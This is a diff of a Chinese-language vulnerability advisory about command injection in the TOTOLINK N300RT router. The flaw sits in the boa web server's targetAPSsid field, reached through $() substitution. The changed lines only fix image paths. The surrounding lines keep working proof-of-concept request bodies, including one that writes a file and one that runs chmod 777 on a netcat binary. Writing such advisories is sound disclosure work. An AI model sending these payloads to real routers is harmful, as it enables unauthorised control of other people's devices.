@@ -12,7 +12,7 @@ TOTOLINK N300RT Router中发现了一个命令注入漏洞，攻击者可以通�
 
 触发点位于`boa` 组件中的`sub_441468`方法，此处对于`targetAPSsid`字段校验不够充分，可以使用$()的方法来绕过，可执行长度不超过32字节的命令。
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-01-26-16-38-35-dd007a4f-6306-419a-acfb-296f313b61f7.png)
+![](../main/images/1.png)
 
 
 
@@ -49,7 +49,7 @@ Priority: u=0, i
 sessionCheck=4843ff699e3002d927adc0b1ff4a9fe4&submit-url=%2Fwlwps.htm&resetUnCfg=0&triggerPIN=1&targetAPMac=001122334455&targetAPSsid=test$(echo test > /tmp/cccc)
 ```
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-01-26-16-48-14-d89d1f6b-fb83-4739-bcb9-301722ba94ed.png)
+![](../main/images/2.png)
 
 除此之外，下面的poc也可用
 
@@ -61,5 +61,6 @@ sessionCheck=d4dc13600dbd8d351ce74e0689da0db8&submit-url=%2Fwlwps.htm&resetUnCfg
 sessionCheck=d4dc13600dbd8d351ce74e0689da0db8&submit-url=%2Fwlwps.htm&resetUnCfg=0&triggerPIN=1&targetAPMac=001122334455&targetAPSsid=t$(chmod 777 /var/boa/nc)
 
 ```
+
 
 
